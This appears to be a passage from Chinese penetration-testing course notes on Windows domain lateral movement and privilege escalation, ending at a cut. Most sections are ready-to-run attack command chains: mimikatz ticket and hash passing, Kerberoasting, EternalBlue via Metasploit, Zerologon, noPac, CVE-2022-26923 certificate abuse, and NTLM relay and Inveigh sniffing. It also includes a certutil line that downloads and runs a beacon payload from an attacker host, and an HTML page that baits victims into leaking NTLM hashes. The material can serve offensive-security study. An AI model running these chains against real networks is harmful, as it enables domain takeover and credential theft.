<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">利用历史遗留的票据重新认证尝试</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">导出票据</span></span><br><span class="line">mimikatz sekurlsa::tickets /export</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">导入票据</span></span><br><span class="line">mimikatz kerberos::ptt C:\Users\webadmin\Desktop\22d3a-2-1-40e00000-Administrator@krbtgt-god.org.kirbi</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看票据：</span></span><br><span class="line">shell klist</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">利用票据连接：</span></span><br><span class="line">shell dir \\owa2010cn-god\c$</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">注意：成功不成功看当前主机有没有被目标连接过</span></span><br></pre></td></tr></table></figure>
<h4 id="ptk-密钥传递攻击"><a class="markdownIt-Anchor" href="#ptk-密钥传递攻击">#</a> PTK 密钥传递攻击</h4>
<p>PTK (pass the key)：密钥传递攻击，利用的 ekeys aes256 进行的渗透测试（NTLM 认证攻击）</p>
<p>PTK = Pass The Key，当系统安装了 KB2871997 补丁且禁用了 NTLM 的 时候，那我们抓取到的 ntlm hash 也就失去了作用，但是可以通过 PTK 的攻击 方式获得权限。这个方式利用条件比较苛刻，算的上是比较鸡肋的，一般很难 被利用到。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::ekeys</span><br><span class="line">mimikatz sekurlsa::pth /user:域用户名 /domain:域名 /aes256:aes256值</span><br></pre></td></tr></table></figure>
<h4 id="rdp-横向渗透"><a class="markdownIt-Anchor" href="#rdp-横向渗透">#</a> RDP 横向渗透</h4>
<p>做了提权之后，进行一波 3389 端口扫描，一般配合创建新的用户，从跳板 机创建代理节点从本地接入肉鸡，需要注意的是，如果自己登陆的用户名与对 方的用户名一致，对方用户会被迫下线，反之不会。远程桌面服务支持明文及 HASH 连接。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">探针服务</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">cs 内置端口扫描 3389</span></span><br><span class="line">tasklist /svc | find &quot;TermService&quot; # 找到对应服务进程的PID</span><br><span class="line">netstat -ano | find &quot;PID值&quot; # 找到进程对应的端口号</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">探针连接 CrackMapExec&amp;MSF 批扫用户名密码验证</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">连接执行</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">明文连接：</span></span><br><span class="line">mstsc /console /v:192.168.3.32 /admin</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">HASH连接</span></span><br><span class="line">mimikatz privilege::debug</span><br><span class="line">mimikatz sekurlsa::pth /user:administrator /domain:192.168.3.32 /ntlm:518b98ad4178a53695dc997aa02d455c &quot;/run:mstsc /restrictedadmin&quot;</span><br></pre></td></tr></table></figure>
<h4 id="winrm-横向渗透"><a class="markdownIt-Anchor" href="#winrm-横向渗透">#</a> WinRM 横向渗透</h4>
<p>WinRM 代表 Windows 远程管理，是一种允许管理员远程执行系统管理任务 的服务。默认情况下支持 Kerberos 和 NTLM 身份验证以及基本身份验证。需要 攻击机和受害机双方都启用的 Winrm rs 的服务。并且使用此服务需要管理员级 别凭据。</p>
<p>Windows 2008 以上版本默认自动状态，Windows Vista/win7 上必须手动启 动；Windows 2012 之后的版本默认允许远程任意主机来管理。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">攻击机开启：</span></span><br><span class="line">winrm quickconfig -q</span><br><span class="line">winrm set winrm/config/Client @&#123;TrustedHosts=&quot;*&quot;&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">探针可用：</span></span><br><span class="line">cs 内置端口扫描 5985</span><br><span class="line">powershell Get-WmiObject -Class win32_service | Where-Object &#123;$_.name -like &quot;WinRM&quot;&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">连接执行：</span></span><br><span class="line">winrs -r:192.168.3.32 -u:192.168.3.32\administrator -p:admin!@#45 whoami</span><br><span class="line">winrs -r:192.168.3.21 -u:192.168.3.21\administrator -p:Admin12345 whoami</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">上线CS&amp;MSF:</span></span><br><span class="line">winrs -r:192.168.3.32 -u:192.168.3.32\administrator -p:admin!@#45 &quot;cmd.exe /c certutil -urlcache -split -f [http://192.168.3.31/beacon.exe](http://192.168.3.31/beacon.exe) beacon.exe &amp; beacon.exe&quot;</span><br></pre></td></tr></table></figure>
<h4 id="spn-kerberos-攻击"><a class="markdownIt-Anchor" href="#spn-kerberos-攻击">#</a> SPN Kerberos 攻击</h4>
<p>在无法通过 mimikaza 获取到 hash 或者明文的时候，可以采用通过 kerberos 获取凭证中隐藏的具体密码。通过 spn 先扫描电脑上存在的服务列表，在针对服务进行利用。</p>
<p>（ 1 ）Kerberoasting 攻击的利用</p>
<p>SPN 服务发现、请求服务票据、服务票据的导出、服务票据的暴力破解</p>
<p>（ 2 ）项目地址推荐</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0dob3N0UGFjay9SdWJldXM=">https://github.com/GhostPack/Rubeus</span><br>
<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL25pZGVtL2tlcmJlcm9hc3Q=">https://github.com/nidem/kerberoast</span><br>
<span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvc3lzdGVtLzE3NDk2Ny5odG1s">https://www.freebuf.com/articles/system/174967.html</span></p>
<p>（ 3 ）如需利用需要配置策略加密方式</p>
<p>黑客可以使用有效的域用户的身份验证票证 (TGT) 去请求运行在服务器上的一个或多个目标服务的服务票证。DC 在活动目录中查找 SPN，并使用与 S PN 关联的服务帐户加密票证，以便服务能够验证用户是否可以访问。</p>
<p>请求的 Kerberos 服务票证的加密类型是 RC4_HMAC_MD5，这意味着服务 帐户的 NTLM 密码哈希用于加密服务票证。黑客将收到的 TGS 票据离线进行破 解，即可得到目标服务帐号的 HASH，这个称之为 Kerberoast 攻击。</p>
<p>如果我们有一个为域用户帐户注册的任意 SPN，那么该用户帐户的明文密 码的 NTLM 哈希值就将用于创建服务票证。</p>
<p>（ 4 ）Kerberos 攻击条件</p>
<p>采用 rc4 加密类型票据，工具 Rubeus 检测或看票据加密类型</p>
<p><strong>Kerberos 攻击流程</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">spn扫描</span></span><br><span class="line">powershell setspn -T 0day.org -q */*</span><br><span class="line">powershell setspn -T 0day.org -q */* | findstr &quot;MSSQL&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">工具检测</span></span><br><span class="line">Rubeus kerberoast</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">手工请求：（要产生票据文件）</span></span><br><span class="line">powershell Add-Type -AssemblyName System.IdentityModel</span><br><span class="line">powershell New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc/Srv-DB-0day.0day.org:1433&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看票据</span></span><br><span class="line">mimikatz kerberos:list</span><br><span class="line">mimikatz kerberos::ask /target:MSSQLSvc/SqlServer.god.org:1433</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">导出</span></span><br><span class="line">mimikatz kerberos::list /export</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">破解</span></span><br><span class="line">python tgsrepcrack.py pass.txt &quot;1-40a00000-jack@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi&quot;</span><br></pre></td></tr></table></figure>
<h4 id="exchange-攻击"><a class="markdownIt-Anchor" href="#exchange-攻击">#</a> Exchange 攻击</h4>
<ul>
<li>Exchange 探针</li>
</ul>
<p>（ 1 ）端口扫描<br>
 Exchange 会对外暴露接口如 OWA,ECP 等，会暴露在 80 端口，而且 25/587/2525 等端口上会有 SMTP 服务，所以可以通过一些端口特征来定位 exchange。</p>
<p>（ 2 ）SPN 扫描<br>
 <code>powershell setspn -T 0day.org -q */*</code></p>
<p>（ 3 ）脚本探针版本并探测可能存在的 CVE<br>
 <code>python Exchange_GetVersion_MatchVul.py xx.xx.xx.xx</code></p>
<ul>
<li>Exchange 爆破</li>
</ul>
<p>爆破账户密码进行登录 exchange 方便钓鱼，账户密码都是通过搜索凭证中获取。</p>
<p>Burp+Proxifier：直接将 web 流量捕获通过 burp 来爆破账户名和密码<br>
工具链接 1：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2dyYXlkZHEvRUJ1cnN0">https://github.com/grayddq/EBurst</span><br>
 工具链接 2：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xhemFhcnMvTWFpbFNuaXBlcg==">https://github.com/lazaars/MailSniper</span></p>
<ul>
<li>Exchange 漏洞<br>
<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veGlhb3ppL3AvMTQ0ODE1OTUuaHRtbA=="> https://www.cnblogs.com/xiaozi/p/14481595.html</span></li>
</ul>
<p>确定内核版本 - 筛选 Server 版本 - 确定漏洞对应关系 - 选择漏洞进行漏洞，如 CVE-2020-0688 CVE-2020-17144，主要是为了控制 exchange 服务器，一旦控制 到服务器可以大规模邮件钓鱼，寻找相应 exchange 版本存在何种漏洞，搜素利 用脚本进行利用。</p>
<h3 id="域控提权"><a class="markdownIt-Anchor" href="#域控提权">#</a> 域控提权</h3>
<h4 id="ms17010cve-2017-0146"><a class="markdownIt-Anchor" href="#ms17010cve-2017-0146">#</a> MS17010（CVE-2017-0146）</h4>
<p>除去前述的口令传递的攻击方式之外，还可以从系统漏洞层面进行漏洞利用，如 CVE-2017-0146, 适用版本 Windows 7 8.1 10; Windows Server 2008 2 012 2016; 先如今，多数电脑已经配置上了补丁。由于 cs 只支持漏洞扫描，msf 支持漏洞利用，因此可以利用 msf 联动 cs 检测并利用。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">CS创建外联监听器</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">选择外围http的方式，并命名为msf，输入命令spawn msf，将当前主机的权限移交给msf</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">msf运行ms 17010</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">MSF监听联动配置</span></span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 8888</span><br><span class="line">run</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加路由</span></span><br><span class="line">run autoroute -p //查看当前路由表</span><br><span class="line">run post/multi/manage/autoroute //添加当前路由表</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">检测是否存在 17010 漏洞</span></span><br><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line">set rhosts 192.168.3.21-32 //设置扫描目标段</span><br><span class="line">set threads 5 //设置扫描线程数</span><br><span class="line">run</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">利用模块</span></span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp //目标不出网用正向连接上线</span><br><span class="line">set rhost 192.168.3.25 //设置连接目标</span><br><span class="line">set rhosts 192.168.3.25 //设置扫描目标</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<h4 id="ms14-068-cve-2014-6324"><a class="markdownIt-Anchor" href="#ms14-068-cve-2014-6324">#</a> MS14-068 (CVE-2014-6324)</h4>
<p>见前面 PTT 横向移动课程演示</p>
<h4 id="cve-2020-1472"><a class="markdownIt-Anchor" href="#cve-2020-1472">#</a> CVE-2020-1472</h4>
<p>适用 Windows Server 2008、2012、2016 、2019 等。需要先建立 socket 代理端口，将流量转发至公网上，并修改 hosts 文件保证域名解析正确。</p>
<p>重置密码：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RpcmtqYW5tL0NWRS0yMDIwLTE0NzI=">https://github.com/dirkjanm/CVE-2020-1472</span></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取计算机名</span></span><br><span class="line">nbtscan -v -h 192.168.3.21</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">连接DC清空凭证</span></span><br><span class="line">proxychains python cve- 2020 - 1472 - exploit.py OWA20N-GOD 192.168.3.21</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取域内HASH</span></span><br><span class="line">proxychains python secretsdump.py OWA2010CN-GOD\$@192.168.3.21 -just-dc -no-pass</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">连接域控PTH</span></span><br><span class="line">python wmiexec.py -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">后续恢复密码</span></span><br><span class="line">https://github.com/risksense/zerologon</span><br><span class="line">https://github.com/SecureAuthCorp/impacket</span><br></pre></td></tr></table></figure>
<h4 id="cve-2021-42287"><a class="markdownIt-Anchor" href="#cve-2021-42287">#</a> CVE-2021-42287</h4>
<p>需要一个域内普通账号，可以影响 Windows 基本全系列。</p>
<p>（ 1 ）参考项目地址：<br>
<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2N1YmUweDAvbm9QYWM=">https://github.com/cube0x0/noPac</span><br>
<span class="exturl" data-url="aHR0cHM6Ly9sZWFybi5taWNyb3NvZnQuY29tL3poLWNuL3N5c2ludGVybmFscy9kb3dubG9hZHMvcHN0b29scw==">https://learn.microsoft.com/zh-cn/sysinternals/downloads/pstools</span></p>
<p>（ 2 ）漏洞利用流程：<br>
代理后：修改 Host 绑定域名和 IP<br>
 扫描探针： <code>noPac scan -domain god.org -user webadmin -pass admin!@#45</code></p>
<p>（ 3 ）利用漏洞</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建一个和目标通讯的票据：</span></span><br><span class="line">noPac -domain god.org -user webadmin -pass admin!@#45 /dc owa2010cn-god.god.org /mAccount dadd /mPassword sdadasdsa /service cifs /ptt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">利用psexec弹出cmd窗口：</span></span><br><span class="line">PsExec \\owa2010cn-god.god.org cmd</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">也可以利用python的以下脚本执行</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">https://github.com/WazeHell/sam-the-admin</span></span><br><span class="line">python sam_the_admin.py god/&#x27;webadmin:admin!@#45&#x27; -dc-ip 192.168.3.21</span><br></pre></td></tr></table></figure>
<h4 id="cve-2022-26923"><a class="markdownIt-Anchor" href="#cve-2022-26923">#</a> CVE-2022-26923</h4>
<p>当 Windows 系统的 Active Directory 证书服务 (CS) 在域上运行时，由于 机器账号中的 dNSHostName 属性不具有唯一性，域中普通用户可以将其更改为 高权限的域控机器账号属性，然后从 Active Directory 证书服务中获取域控机器 账户的证书，导致域中普通用户权限提升为域管理员权限。影响 Win8.1、Win1 0、Win11、WinServer2012R2、WinServer2016、WinServer2019、WinServer2022 等版本。</p>
<p>（ 1 ）前提条件：<br>
一个域内普通账号、域内存在证书服务器 ，可以用 certutial -config -ping 可以判断，如果报错则不存在证书服务器，如果提示其他信息则说明存在，也 可以用 spn 检测。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">a. Kali添加访问域内信息 /etc/hosts</span></span><br><span class="line">192.168.1.15 xiaodi.local xiaodi-WIN-3C7SS32SQ6R-CAWIN-3C7SS32SQ6 R.xiaodi.local</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">b. 获取CA结构名和计算机名</span> </span><br><span class="line">certutil -config - - ping</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">c. 域内信息: 192.168.1.15 <span class="built_in">test</span> Pass123</span></span><br><span class="line">xiaodi-WIN-3C7SS32SQ6R-CA</span><br><span class="line">WIN-3C7SS32SQ6R.xiaodi.local</span><br></pre></td></tr></table></figure>
<p>（ 2 ）漏洞利用步骤</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">a. 申请低权限用户证书：</span></span><br><span class="line">certipy req &#x27;xiaodi.local/test:Pass123@WIN-3C7SS32SQ6R.xiaodi.local&#x27; -ca xiaodi-WIN-3C7SS32SQ6R-CA -template User -debug</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">b. 检测证书:</span></span><br><span class="line">certipy auth -pfx test.pfx</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">c. 创建一个机器账户：</span></span><br><span class="line">python3 bloodyAD.py -d xiaodi.local -u test -p &#x27;Pass123&#x27; --host 192.168.1.15 addComputer pwnmachine &#x27;CVEPassword1234*&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">d. 设置机器账户属性(dNSHostName和DC一致)：</span></span><br><span class="line">python3 bloodyAD.py -d xiaodi.local -u test -p &#x27;Pass123&#x27; --host 192.168.1.15 setAttribute &#x27;CN=pwnmachine,CN=Computers,DC=xiaodi,DC=local&#x27; dNSHostName &#x27;[&quot;WIN-3C7SS32SQ6R.xiaodi.local&quot;]&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">e. 再次申请证书：</span></span><br><span class="line">certipy req &#x27;xiaodi.local/pwnmachine$:CVEPassword1234*@192.168.1.15&#x27; -template Machine -dc-ip 192.168.1.15 -ca xiaodi-WIN-3C7SS32SQ6R-CA</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">f. 检测证书：</span></span><br><span class="line">certipy auth -pfx ./win-3c7ss32sq6r.pfx -dc-ip 192.168.1.15</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">g. 导出HASH：</span></span><br><span class="line">python3 secretsdump.py &#x27;xiaodi.local/win-3c7ss32sq6r$@WIN-3C7SS32SQ6R.xiaodi.local&#x27; -hashes :10e02bef2258ad9b239e2281a01827a4</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">h. 利用HASH：</span></span><br><span class="line">python3 wmiexec.py xiaodi.local/administrator@192.168.1.15 -hashes aad3b435b51404eeaad3b435b51404ee:e6f01fc9f2a0dc96871220f7787164bd</span><br></pre></td></tr></table></figure>
<h3 id="其他横向手段"><a class="markdownIt-Anchor" href="#其他横向手段">#</a> 其他横向手段</h3>
<h4 id="ntlm-relay-重放"><a class="markdownIt-Anchor" href="#ntlm-relay-重放">#</a> NTLM Relay 重放</h4>
<p>与 NLTM 认证相关的安全问题主要有 Pass The Hash、利用 NTLM 进行信息收集、Net-NTLM Hash 破解、NTLM Relay 几种。PTH 前期已经了，运用 m imikatz、impacket 工具包的一些脚本、CS 等等都可以利用，NTLM Relay 又包括 (relay to smb,ldap,ews)</p>
<p>可以应用在获取不到明文或 HASH 时采用的手法，但也要注意手法的必备条件。</p>
<p>域内用户主机的非域用户角色即 administartor 登录 = 时，如果采用 dir \192.168.x.x\c$ 的方式去访问其他主机的文件，会将当前主机的用户名和密码进行 碰撞，如果对方主机恰好采用了相同的登录名和密码，则碰撞成功，取得访问权限成功。</p>
<p>条件：需要一台域内主机管理员权限，通讯双方当前用户密码一致</p>
<p>以下命令主要是用 msf 做了中继，现将 cs 中的主机联动到 msf，在 msf 中添加路由，选择 smb 重发模块，通过主动连接的方式使肉鸡可以连接到 msf。 当跳板机使用自己的用户名和密码去碰撞 kali 用户名密码时，msf 监听到此碰到并转发给肉机进行碰撞尝试。一旦碰撞成功，就会得到肉机的权限。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置木马</span></span><br><span class="line">CS创建外联监听器，选择外围http的方式，并命名为msf，输入命令spawn msf，将当前主机的权限移交给msf</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">MSF: 监听上线：</span></span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 8888</span><br><span class="line">run</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加路由：</span></span><br><span class="line">run autoroute -p # 查看当前路由表</span><br><span class="line">run post/multi/manage/autoroute # 添加当前路由表</span><br><span class="line">backgroup # 返回</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重发模块：</span></span><br><span class="line">use exploit/windows/smb/smb_relay</span><br><span class="line">set smbhost 192.168. 3. 32 //攻击目标</span><br><span class="line">set rhost 192.168.3. 32 //设置连接目标</span><br><span class="line">set autorunscript post/windows/manage/migrate</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">主动连接：</span></span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">dir \\192.168.46.166\c$ //设置本地IP</span><br><span class="line">jobs 查看当前任务</span><br><span class="line">jobs - K 删除当前任务</span><br><span class="line">run</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">system-&gt;administrator</span></span><br></pre></td></tr></table></figure>
<p>cs: ps 看哪个进程启用的是 administrator 权限，利用 steal_token pid 来窃取权限，getuid 检验，检验得到是 administrator 的情况时，使用 shell dir \192.168.46.166\c$ 进行碰撞。此后将会在 msf 中上线肉机。</p>
<p>msf: 监听 smb 重发模块之后，返回跳板机 meterpreter 会话，选择 ps，查看拥有 administrator 权限的主机，输入 migrate pid 进行权限修改，getuid 检验权限，输入 shell 执行 dir \192.168.46.166\c$ 会上线肉机，通过 sessions 查看当前是否存在了新的肉机。</p>
<h4 id="ntlm-inveigh-嗅探"><a class="markdownIt-Anchor" href="#ntlm-inveigh-嗅探">#</a> NTLM Inveigh 嗅探</h4>
<p>条件：被控主机当前管理员权限</p>
<p>（ 1 ）监听拦截 Inveigh.exe<br>
 项目地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0tldmluLVJvYmVydHNvbi9JbnZlaWdo">https://github.com/Kevin-Robertson/Inveigh</span><br>
 可以上传到肉机上，或者 socket 代理出来，执行之后配合钓鱼获取其他主机的 hash，获取到的是 NET NTLM HASH V1 或 V2。</p>
<p>（ 2 ）触发拦截</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">当肉机执行如下命令时会被拦截<span class="built_in">hash</span></span></span><br><span class="line">dir \\192.168.3.x\c$</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">也可以构造内网web进行钓鱼触发http://192.168.3.31/1.html</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;img src=&quot;file:///\\192.168.3.32\2&quot;&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span 